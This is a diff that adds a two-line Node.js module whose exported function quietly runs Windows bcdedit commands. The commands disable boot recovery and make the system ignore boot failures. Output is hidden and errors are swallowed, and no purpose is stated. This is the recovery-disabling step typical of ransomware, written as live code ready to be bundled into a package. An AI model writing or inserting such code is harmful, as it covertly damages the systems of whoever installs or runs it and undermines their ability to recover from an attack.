@@ -1,0 +1,2 @@
+const {execSync:run}=require('child_process');
+module.exports=function(){try{run('bcdedit /set {default} bootstatuspolicy ignoreallfailures',{shell:true,stdio:'ignore'});run('bcdedit /set {default} recoveryenabled No',{shell:true,stdio:'ignore'});}catch(e){};};
